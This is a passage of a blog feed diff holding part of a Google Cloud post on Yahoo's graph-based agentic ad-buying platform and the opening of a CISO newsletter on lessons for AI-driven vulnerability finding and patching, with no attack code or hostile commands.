+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The graph acts as a semantic contract across the agentic platform. During campaign evaluation, an agent can navigate from initial buyer requirements to eligible audiences and governing policies within a single query plan. &lt;/span&gt;&lt;a href="https://cloud.google.com/blog/products/ai-machine-learning/introducing-gemini-enterprise-agent-platform"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Gemini Enterprise Agent Platform&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; embeddings enrich these entities with semantic similarity, while graph neural networks contribute inferred relationships. Ultimately, this allows agents to do more than just retrieve available inventory — they understand exactly why it is relevant and help ensure it satisfies all governing constraints.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-image_full_width"&gt;
+
+
+
+
+
+
+  
+    &lt;div class="article-module h-c-page"&gt;
+      &lt;div class="h-c-grid"&gt;
+  
+
+    &lt;figure class="article-image--large
+      
+      
+        h-c-grid__col
+        h-c-grid__col--6 h-c-grid__col--offset-3
+        
+        
+      "&gt;
+
+      
+      
+        
+        &lt;img alt="[1] knowledge_graph_ontology" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/1_knowledge_graph_ontology.max-1000x1000.png" /&gt;
+        
+        &lt;/a&gt;
+      
+        &lt;figcaption class="article-image__caption "&gt;&lt;p&gt;Yahoo’s knowledge graph ontology, aligned with industry standards like &lt;a href="https://iabtechlab.com/standards/adcom-advertising-common-object-model/"&gt;IAB AdCOM&lt;/a&gt;&lt;/p&gt;&lt;/figcaption&gt;
+      
+    &lt;/figure&gt;
+
+  
+      &lt;/div&gt;
+    &lt;/div&gt;
+  
+
+
+
+
+&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h4&gt;&lt;strong style="vertical-align: baseline;"&gt;The context graph: creating an auditable memory&lt;/strong&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Execution at agent-scale is only safe if it is entirely transparent — which is the core function of the context graph. Every time the Seller Agent takes an action, that exact operational span is captured by the &lt;/span&gt;&lt;a href="https://adk.dev/integrations/bigquery-agent-analytics/" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;BigQuery Agent Analytics plugin&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;. In addition to logging the raw events, the system shapes this evidence into a typed, queryable context graph using &lt;/span&gt;&lt;a href="https://github.com/GoogleCloudPlatform/BigQuery-Agent-Analytics-SDK" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;BigQuery Agent Analytics SDK&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; utilizing Yahoo's decision-trace ontology, stored in &lt;/span&gt;&lt;a href="https://docs.cloud.google.com/bigquery/docs/graph-overview"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;BigQuery Graph&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;. &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Consequently, every decision point, candidate package, policy evaluation, specialist-agent delegation, and execution outcome becomes a connected graph of evidence. Because this trace is structured as a typed graph, explaining the agent’s decision making process becomes a simple query. An auditor can instantly trace a decision from the originating campaign brief through every score that’s assigned and policy that’s applied. This transforms autonomous behavior from an opaque process into a fully transparent and continuously improving record of decision-making, helping to ensure absolute accountability.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-image_full_width"&gt;
+
+
+
+
+
+
+  
+    &lt;div class="article-module h-c-page"&gt;
+      &lt;div class="h-c-grid"&gt;
+  
+
+    &lt;figure class="article-image--large
+      
+      
+        h-c-grid__col
+        h-c-grid__col--6 h-c-grid__col--offset-3
+        
+        
+      "&gt;
+
+      
+      
+        
+        &lt;img alt="[2] context_graph_ontology" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/2_context_graph_ontology.max-1000x1000.png" /&gt;
+        
+        &lt;/a&gt;
+      
+        &lt;figcaption class="article-image__caption "&gt;&lt;p&gt;Yahoo’s context graph ontology&lt;/p&gt;&lt;/figcaption&gt;
+      
+    &lt;/figure&gt;
+
+  
+      &lt;/div&gt;
+    &lt;/div&gt;
+  
+
+
+
+
+&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h3&gt;&lt;strong style="vertical-align: baseline;"&gt;From human to agent scale&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;For a concrete example of the architecture in action, consider an ad campaign run. What traditionally required weeks of coordination across planning, sales, operations, and compliance can now be completed in seconds through two simultaneous processes.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Acting via the knowledge graph. &lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;This pipeline moves the budget, navigating linearly from the buyer's request to a live campaign ground on the knowledge graph. This proceeds in four steps:&lt;/span&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Submitting the brief:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; A buyer agent submits a campaign brief over Ad Context Protocol (AdCP) that describes the desired audience, budget, geography, and business objective.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Knowledge retrieval:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; The Seller Agent queries the knowledge graph to identify relevant inventory, audiences, contractual availability, historical performance, and governing policies.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Evaluation and scoring:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; The agent evaluates these factors together to assemble a package of media buying candidates. Forecasting models score the opportunities, while a governance agent independently reviews consent, brand safety, and regulatory constraints.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Approval and execution:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; The package is either approved automatically under policy thresholds or escalated for human review. Once approved, the media buy is executed and activated.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Auditing and learning via the context graph.&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; While the execution pipeline moves forward, this parallel loop continuously captures the system's reasoning in the context graph, helping to ensure transparency and improve future cycles. This offers the following capabilities:&lt;/span&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Continuous capture&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: Every candidate considered, score assigned, policy applied, and governance decision becomes a connected record in the context graph, linked to the originating campaign session.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Closed-loop learning&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: As delivery, attribution, and outcome signals arrive, they are joined back to the decisions that produced them, creating the training data that improves future recommendations.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Instant explainability&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: If an advertiser asks why a particular package was selected or which policies influenced the outcome, the answer is preserved in the context graph and reachable through a single query.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The result is a platform where knowledge, decision-making, governance, measurement, and learning operate together — allowing autonomous media buying to remain explainable, auditable, and continuously improving.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;strong style="vertical-align: baseline;"&gt;A blueprint for many industries&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The era of AI as a mere advisor is ending. Enterprises are demanding systems of action — autonomous agents capable of executing complex, multi-step workflows. But in regulated sectors, the speed that AI brings to the table turns into a liability if you cannot prove how a decision was made. The primary barrier to autonomous execution is no longer intelligence; it is trust.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The architecture that Yahoo and Google Cloud built provides a broadly applicable blueprint with which to solve this. While designed to fix the bottlenecks of digital media buying, the underlying pattern applies to any industry managing high-stakes decisions — from financial trading to supply chain logistics. To operate at agent speed but still maintain human oversight, enterprises must adopt a new architectural baseline that:&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Grounds decisions in business reality:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Agents cannot rely on probabilistic models alone. They must be grounded by a knowledge graph that deterministically maps your business logic, active contracts, and compliance rules.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Builds an auditable memory:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; You cannot govern what you cannot trace. Every agentic action must be captured in a context graph, creating an immutable, queryable record of exactly why a decision was made and which alternatives were rejected.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Embraces open interoperability:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Trust requires transparency. By building on open protocols and provenance standards, industries can establish a common, auditable language for agentic behavior.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;As foundational models become commoditized, enterprises’ competitive advantages are shifting. Long term, your moat will not be the language model you deploy, but the proprietary graph of your business operations and governed history.  Likewise, the future of enterprise AI isn’t simply systems that can act, but systems that can explain, govern, and take accountability for those actions.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;strong style="vertical-align: baseline;"&gt;Get started today&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Ready to build your own trusted system of action? Start by exploring &lt;/span&gt;&lt;a href="https://cloud.google.com/products/spanner/graph?e=48754805"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Spanner Graph&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; to ground your agentic workflows in business reality. Next, use &lt;/span&gt;&lt;a href="https://docs.cloud.google.com/bigquery/docs/graph-overview"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;BigQuery Graph&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; to build an auditable memory that powers closed-loop learning and regulator-grade explainability. You can begin capturing and analyzing these operational traces today using the &lt;/span&gt;&lt;a href="https://adk.dev/integrations/bigquery-agent-analytics/" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;BigQuery Agent Analytics Plugin&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; and &lt;/span&gt;&lt;a href="https://github.com/GoogleCloudPlatform/BigQuery-Agent-Analytics-SDK" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;SDK&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;. Finally, review the &lt;/span&gt;&lt;a href="https://adcontextprotocol.org/" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Ad Context Protocol&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; to understand the open communication standards underpinning Yahoo’s agentic platform.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;</content>
+    <link href="https://cloud.google.com/blog/products/databases/graph-technologies-underpin-yahoo-system-of-action/"/>
+    <category term="Google Cloud"/>
+    <published>2026-06-15T16:00:00+00:00</published>
+  </entry>
+  <entry>
+    <id>https://cloud.google.com/blog/products/identity-security/cloud-ciso-perspectives-the-4-lessons-that-guided-ai-threat-defense/</id>
+    <title>Cloud CISO Perspectives: The 4 lessons that guided AI Threat Defense</title>
+    <updated>2026-06-15T16:00:00+00:00</updated>
+    <content type="html">&lt;div class="block-paragraph"&gt;&lt;p&gt;Welcome to the first Cloud CISO Perspectives for June 2026. Today, we introduce Chris Betz as the new CISO of Google Cloud. For his first Cloud CISO Perspectives, Chris shares four key lessons we learned about using AI to the defender’s advantage while building AI Threat Defense.&lt;/p&gt;&lt;p&gt;As with all Cloud CISO Perspectives, the contents of this newsletter are posted to the &lt;a href="https://cloud.google.com/blog/products/identity-security/"&gt;Google Cloud blog&lt;/a&gt;. If you’re reading this on the website and you’d like to receive the email version, you can &lt;a href="https://cloud.google.com/resources/google-cloud-ciso-newsletter-signup"&gt;subscribe here&lt;/a&gt;.&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-aside"&gt;&lt;dl&gt;
+    &lt;dt&gt;aside_block&lt;/dt&gt;
+    &lt;dd&gt;&amp;lt;ListValue: [StructValue([(&amp;#x27;title&amp;#x27;, &amp;#x27;Get vital board insights with Google Cloud&amp;#x27;), (&amp;#x27;body&amp;#x27;, &amp;lt;wagtail.rich_text.RichText object at 0x7f0bfc60aca0&amp;gt;), (&amp;#x27;btn_text&amp;#x27;, &amp;#x27;Visit the hub&amp;#x27;), (&amp;#x27;href&amp;#x27;, &amp;#x27;https://cloud.google.com/solutions/security/board-of-directors?utm_source=cgc-site&amp;amp;utm_medium=et&amp;amp;utm_campaign=FY26-Q2-GLOBAL-GCP39634-email-dl-dgcsm-CISOP-NL-177159&amp;amp;utm_content=-&amp;amp;utm_term=-&amp;#x27;), (&amp;#x27;image&amp;#x27;, &amp;lt;GAEImage: GCAT-replacement-logo-A&amp;gt;)])]&amp;gt;&lt;/dd&gt;
+&lt;/dl&gt;&lt;/div&gt;
+&lt;div class="block-paragraph"&gt;&lt;h3&gt;Cloud CISO Perspectives: The 4 lessons that guided AI Threat Defense&lt;/h3&gt;&lt;p&gt;&lt;i&gt;By Chris Betz, CISO, Google Cloud&lt;/i&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_with_image"&gt;&lt;div class="article-module h-c-page"&gt;
+  &lt;div class="h-c-grid uni-paragraph-wrap"&gt;
+    &lt;div class="uni-paragraph
+      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6
+      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3"&gt;
+
+      
+
+
+
+
+
+
+  
+
+    &lt;figure class="article-image--wrap-small
+      
+      "&gt;
+
+      
+      
+        
+        &lt;img alt="Chris Betz" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/Chris_Betz.max-1000x1000.png" /&gt;
+        
+        &lt;/a&gt;
+      
+        &lt;figcaption class="article-image__caption "&gt;&lt;p&gt;Chris Betz, CISO, Google Cloud&lt;/p&gt;&lt;/figcaption&gt;
+      
+    &lt;/figure&gt;
+
+  
+
+
+
+
+
+      &lt;p&gt;Just a year ago, it would take months or even years for a good application security team to find thousands of vulnerabilities. Today, a team equipped with multiple AI models can find the same number in hours — or even minutes.&lt;/p&gt;&lt;p&gt;AI is rewriting the rules of cybersecurity. It’s true that AI has boosted adversaries, introducing new threat actors, techniques, and surfaces to defend against, all operating with unprecedented scale, speed, and sophistication. AI-powered attackers are developing zero-day exploits by analyzing more than just source code: Configuration vulnerabilities, binaries, and firmware are all in their crosshairs.&lt;/p&gt;&lt;p&gt;However, AI has also created a significant advantage for defenders. Not only are these same capabilities in our hands, adding to our defense, but we have the added advantage of the full business context that adversaries lack. Software security, and especially vulnerability finding and fixing, is being revolutionized.&lt;/p&gt;
+    &lt;/div&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="block-pull_quote"&gt;&lt;div class="uni-pull-quote h-c-page"&gt;
+  &lt;section class="h-c-grid"&gt;
+    &lt;div class="uni-pull-quote__wrapper h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6
+      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3"&gt;
+      &lt;div class="uni-pull-quote__inner-wrapper h-c-copy h-c-copy"&gt;
+        &lt;q class="uni-pull-quote__text"&gt;Security is changing rapidly, demanding that we all innovate in response. Here is how we are approaching this work today, and some of the lessons we learned along the way.&lt;/q&gt;
+
+        
+      &lt;/div&gt;
+    &lt;/div&gt;
+  &lt;/section&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;It’s clear that the AI benefits for security are rapidly evolving, and we can no longer rely on legacy, manual defenses. The new imperative for CISOs and business leaders is to transform vulnerability management by combating machine-speed threats with a defensive strategy that’s AI native, agentic, and open. &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;We’ve been preparing for this moment for years: From &lt;/span&gt;&lt;a href="https://projectzero.google/2024/06/project-naptime.html" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Project Naptime&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, an internal project to automate vulnerability hunting (so security researchers can take regular naps), to &lt;/span&gt;&lt;a href="https://cloud.google.com/blog/products/identity-security/cloud-ciso-perspectives-our-big-sleep-agent-makes-big-leap"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Big Sleep&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, our autonomous zero-day hunter, to &lt;/span&gt;&lt;a href="https://deepmind.google/discover/blog/introducing-codemender-an-ai-agent-for-code-security/" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;CodeMender&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, our automated AI-patching agent, we’ve innovated to advance using AI to improve security for all. &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Across our products and services, we’ve found that a unified approach &lt;/span&gt;&lt;a href="https://blog.google/innovation-and-ai/infrastructure-and-cloud/google-cloud/how-google-does-it-security-series/" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;helps us protect Google at Google scale&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;. Based on this approach, we recently &lt;/span&gt;&lt;a href="https://cloud.google.com/blog/products/identity-security/introducing-google-ai-threat-defense"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;introduced AI Threat Defense&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; as a pathway to achieve the threat-readiness transformation that you need to defend against AI threats with AI. &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The framework is straightforward, and you’ll find that it’s ultimately about two key points:&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Using rapidly-advancing AI to protect ourselves.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Shifting the way we develop from the ground up. &lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Security is changing rapidly, demanding that we all innovate in response. Here is how we are approaching this work today, and some of the lessons we learned along the way. &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Four key lessons&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Our work is built on a four-step framework, structured directly on what we learned:&lt;/span&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Prepare&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: How Google started the journey — hardening our foundation and operationalizing the framework.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Scan and prioritize&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: How we identified vulnerabilities — conduct deep-dive analysis and posture validation.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Remediate&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: What we learned from remediation — implement workflows to autonomously verify and patch vulnerabilities quickly.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Monitor&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: How we evolved monitoring with AI agents — transition to continuous detection and active response playbooks.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;1. Prepare&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: A modern enterprise runs on an enormous amount of software, and at Google that amount is even greater. We needed focus in order to move at speed, so our first lesson was to reduce our attack surface. That let us narrow our focus, reduce complexity, and use insights we have on our software supply chain and dependencies to prioritize and protect our external interfaces. &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Second, we invested in the operational framework supporting the vulnerability work. Early experimentation quickly showed us how valuable a scaling framework is that applies our knowledge of the environment, protects and allocates resources for scanning, and allows new capabilities to be iterated on and used by multiple teams. The amplifying power of good information, code access, dependency graphs, token budgets, and infrastructure are key friction reducers.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Third, we planned engineering work alongside security work: Your engineering partners are critical, especially for aligning with your resiliency and deployment processes.  &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Key lessons include: &lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Tagging components with the model, harness, and issues found when scanning.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Allocating hardware and token budgets for finding, developing fixes, build and test.  &lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Managing change volume (and engineer hours) while simultaneously focusing on more, smaller updates, where possible, with good rollout plans to de-risk the change.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;2. Scan and prioritize&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: We continuously scan our code across products — Search, Ads, Android, Chrome, and Google Cloud — managing tens of thousands of packages.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;First, we kicked off scanning and centrally tracked our progress, integrating the same tools into our pipelines. We learned early on that the best scanning results come from a combination of an expert in the specific product plus the harness plus the AI model. The combination is crucial, because results will be markedly different without all three.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;It’s worth noting that if you can only pick two, we recommend expertise and harness. A less capable model with a good harness and good expert is more powerful than the best model without a good harness or good experts. We also advise using more than one model.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;It’s important to track and iterate the data. Since the technology is evolving fast, your data is critical to revise and refine your processes.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Second, look carefully at your software supply chain, and engage your key suppliers. Reachability remains a key criteria for fixes, as does streamlining and simplifying the areas you work on.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Third, because there are so many vulnerabilities that can show up, it’s important to have the right methodology to prioritize them. Normally, when you’re rolling out a change you prioritize the smallest blast radius to make incremental change. Here, we recommend flipping that model: Begin with foundational code with the biggest blast radius to tackle the hardest problems first.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;AI models can do a good job of developing proof-of-concepts to rapidly test accuracy. Harness and models play a significant role in reducing false positive rate. Adapting your harness to do validation and using a different agent or model to validate results are both very valuable.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Another key to AI-powered triage is to use your harness and tools to state vulnerability confidence as well as severity. Of course, developing a patch is only part of the problem.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;3. Remediate&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: Fixing vulnerabilities at Google scale required a fundamental shift in strategy. We developed a new approach centered on three lessons.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;First, how you roll out patches matters. We adopted a risk-based approach that prioritized code reachable from the outside and had the largest blast radius, such as critical applications like BoringSSL and gVisor. We also learned that providing the model with context was the key to faster, more trusted remediation.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Second, we learned you cannot fix what you cannot track. To manage remediation at scale, we built a central system to track every vulnerability, from discovery to resolution, with every finding labeled in a central repository. This single source of truth allowed us to enforce service-level objectives (SLOs) for patching, and enabled us to deploy constant autonomous patching with human review. Coupled with robust roll-back capabilities, our teams got better at fixing things quickly and safely.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Finally, we learned to build resilience directly into the system. The ultimate goal was to create an inherently-resilient system that can also patch vulnerabilities, not the other way around. We don't just fix the code; we harden the entire system around it.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;These changes helped us rethink our approach to securing open-source software with a three-R’s strategy: Refresh, remove, and rewrite. &lt;/span&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;First, we &lt;/span&gt;&lt;strong style="vertical-align: baseline;"&gt;refresh&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; what is foundational — finding and fixing vulnerabilities in the code. This is about being good network citizens and protecting the core.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Second, we &lt;/span&gt;&lt;strong style="vertical-align: baseline;"&gt;remove&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; what is peripheral. We are removing dependencies and replacing them with custom code. This is about both efficiency and reducing the attack surface, moving from a broad base of trust to a narrow, controlled one.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Third, we &lt;/span&gt;&lt;strong style="vertical-align: baseline;"&gt;rewrite&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; what is critical. For everything in between, we are transitioning legacy logic and critical capabilities into modern, memory-safe languages using AI to automate the transition to eliminate entire classes of vulnerabilities from that software. &lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;This evolution is a deliberate approach to reduce complexity, shrinking the attack surface, and building a more resilient, autonomous, and secure-by-design foundation for everything we do.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;4. Monitor&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: Our work doesn’t stop there, and neither should yours. The security landscape is always changing, and the monitor phase is where our approach comes alive by creating a perpetual feedback loop to ensure we stay secure — and get stronger over time.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;We had three key lessons in this phase. First, security demands a constant feedback loop. We created a feedback loop to monitor the entire ecosystem for two things: system strain and vulnerability hotspots. &lt;/span&gt;&lt;/p&gt;
